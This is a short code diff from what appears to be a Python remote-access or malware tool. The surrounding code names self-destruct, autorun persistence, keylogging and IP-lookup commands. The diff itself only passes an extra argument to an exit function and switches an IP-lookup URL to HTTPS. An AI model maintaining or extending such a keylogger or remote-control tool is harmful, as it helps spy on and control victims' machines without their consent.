@@ -728,7 +728,7 @@ def command_destruct(_arguments, _event) -> str:
     autorun_register()
 
     # Exiting.
-    return command_exit(_arguments)
+    return command_exit(_arguments, _event)
 
 
 def command_keylog(_arguments, _event) -> str:
@@ -1480,7 +1480,7 @@ def get_ip():
         # Trying to get IP.
 
         # API Provider.
-        _api_provider = "http://ipinfo.io/json"
+        _api_provider = "https://ipinfo.io/json"
 
         # Returning JSON data.
         return requests.get(_api_provider).json()
